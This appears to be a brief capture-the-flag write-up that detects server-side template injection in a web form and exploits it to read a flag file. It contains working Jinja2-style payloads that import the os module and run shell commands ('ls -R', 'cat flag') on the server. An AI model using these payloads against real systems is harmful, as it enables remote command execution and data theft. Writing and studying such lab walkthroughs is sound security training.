# SSTI

## identifying vulnerability

we are welcomed by a form that ask for input

![image](../../../Assets/11-1.png)

if we input something like `{{2*2}}` we get the result

![image](../../../Assets/11-2.png)

this means the input is vulnerable to SSTI

## Exploiting the vulnerability

we can use this to read files in the server

```
{{request.application.__globals__.__builtins__.__import__('os').popen('ls -R').read()}}
```

![image](../../../Assets/11-4.png)

we can see that there is a file named flag, we can read it using

```
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```

![image](../../../Assets/11-3.png)

and we get the flag